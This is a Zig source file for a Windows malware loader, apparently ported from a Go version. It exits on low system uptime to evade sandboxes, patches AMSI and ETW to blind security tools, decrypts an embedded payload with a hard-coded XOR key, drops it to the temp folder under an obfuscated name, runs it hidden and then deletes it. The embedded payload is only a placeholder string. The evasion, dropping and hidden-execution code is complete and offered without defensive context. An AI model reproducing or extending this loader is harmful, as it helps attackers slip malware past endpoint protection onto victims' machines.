const std = @import("std");
const furtivo = @import("furtivo.zig");
const direto = @import("direto/direto.zig");

// Embedded payload, simulating the embedded go file
// In a real build, we might use @embedFile("payload.enc")
// const payload_enc = @embedFile("payload.enc");
const payload_enc = "DUMMY_DATA_FOR_NOW";

const obf_key = [_]u8{ 0x4b, 0x37, 0xd2, 0x8f, 0x1c, 0xa5, 0x6e, 0x93, 0x0f, 0x5a, 0xc8, 0x21, 0x7d, 0xe4, 0x19, 0xb6 };

fn decAlloc(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
    if (s.len == 0) return allocator.alloc(u8, 0);

    const decoded_len = try std.base64.standard.Decoder.calcSizeForSlice(s);
    const decoded = try allocator.alloc(u8, decoded_len);
    errdefer allocator.free(decoded);

    try std.base64.standard.Decoder.decode(decoded, s);

    for (decoded, 0..) |*b, i| {
        b.* = b.* ^ obf_key[i % obf_key.len];
    }
    return decoded;
}

fn getTickCount64() u64 {
    const k32 = furtivo.getModuleHandle("kernel32.dll");
    if (k32 == 0) return 60000;
    const proc = furtivo.getProcAddress(k32, "GetTickCount64");
    if (proc == 0) return 60000;

    var ret: u64 = undefined;
    asm volatile (
        \\ call *%[func]
        : [ret] "={rax}" (ret)
        : [func] "r" (proc)
        : .{ .rcx = true, .rdx = true, .r8 = true, .r9 = true, .r10 = true, .r11 = true, .memory = true }
    );
    return ret;
}

fn isUptimeShort() bool {
    const tick = getTickCount64();
    const min = tick / (1000 * 60);
    return min < 30;
}

fn decryptPayload(allocator: std.mem.Allocator) ![]u8 {
    // Dummy decryption for now, matching the go code structure
    if (payload_enc.len == 0) return error.EmptyPayload;

    const key = "x9k2m_d4e2b8f1_stage2";
    var hash: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(key, &hash, .{});

    const b = std.base64.standard.Decoder.decodeAlloc(allocator, payload_enc) catch try allocator.dupe(u8, payload_enc);
    
    for (b, 0..) |*byte, i| {
        byte.* = byte.* ^ hash[i % 32];
    }
    return b;
}

pub fn main(io: std.Io) !void {
    // If we want a windowless app:
    // This is handled in build.zig by setting subsystem = .Windows

    if (isUptimeShort()) {
        std.process.exit(0);
    }

    furtivo.patchAMSI();
    furtivo.patchETW();

    const allocator = std.heap.page_allocator;

    const data = decryptPayload(allocator) catch {
        std.process.exit(0);
    };
    defer allocator.free(data);

    // Write to Temp and execute
    const tmp_dir_path = furtivo.getEnvVar(allocator, "TEMP") catch blk: {
        break :blk furtivo.getEnvVar(allocator, "TMP") catch try allocator.dupe(u8, "C:\\Temp");
    };
    defer allocator.free(tmp_dir_path);

    const tmp_name = try decAlloc(allocator, "PESn/3jEGvYhP7BE"); // Usually an obfuscated name like "updater.exe"
    defer allocator.free(tmp_name);

    const exe_path = try std.fs.path.join(allocator, &[_][]const u8{ tmp_dir_path, tmp_name });
    defer allocator.free(exe_path);

    var file = try std.Io.Dir.createFileAbsolute(io, exe_path, .{ .truncate = true });
    try file.writeStreamingAll(io, data);
    file.close(io);

    // Execute the dropped file hidden using dynamic CreateProcessW
    const k32 = furtivo.getModuleHandle("kernel32.dll");
    const CreateProcessW = @as(?*const fn (
        lpApplicationName: ?[*:0]const u16,
        lpCommandLine: ?[*:0]u16,
        lpProcessAttributes: ?*anyopaque,
        lpThreadAttributes: ?*anyopaque,
        bInheritHandles: i32,
        dwCreationFlags: u32,
        lpEnvironment: ?*anyopaque,
        lpCurrentDirectory: ?[*:0]const u16,
        lpStartupInfo: *anyopaque,
        lpProcessInformation: *anyopaque,
    ) callconv(.winapi) i32, @ptrFromInt(furtivo.getProcAddress(k32, "CreateProcessW"))) orelse return error.ProcNotFound;

    const STARTUPINFOW = extern struct {
        cb: u32,
        lpReserved: ?[*]u16,
        lpDesktop: ?[*]u16,
        lpTitle: ?[*]u16,
        dwX: u32,
        dwY: u32,
        dwXSize: u32,
        dwYSize: u32,
        dwXCountChars: u32,
        dwYCountChars: u32,
        dwFillAttribute: u32,
        dwFlags: u32,
        wShowWindow: u16,
        cbReserved2: u16,
        lpReserved2: ?*u8,
        hStdInput: ?*anyopaque,
        hStdOutput: ?*anyopaque,
        hStdError: ?*anyopaque,
    };

    const PROCESS_INFORMATION = extern struct {
        hProcess: *anyopaque,
        hThread: *anyopaque,
        dwProcessId: u32,
        dwThreadId: u32,
    };

    var si = std.mem.zeroInit(STARTUPINFOW, .{
        .cb = @sizeOf(STARTUPINFOW),
        .dwFlags = 0x00000001, // STARTF_USESHOWWINDOW
        .wShowWindow = 0,     // SW_HIDE
    });
    var pi: PROCESS_INFORMATION = undefined;

    const exe_path_w = try std.unicode.utf8ToUtf16LeAllocZ(allocator, exe_path);
    defer allocator.free(exe_path_w);

    if (CreateProcessW(exe_path_w, null, null, null, 0, 0x00000008, null, null, &si, &pi) != 0) {
        // Successfully spawned
        // In a loader we usually don't wait for completion if it's the next stage
    }

    direto.ntDelayExecution(3000);
    std.Io.Dir.deleteFileAbsolute(io, exe_path) catch {};
}
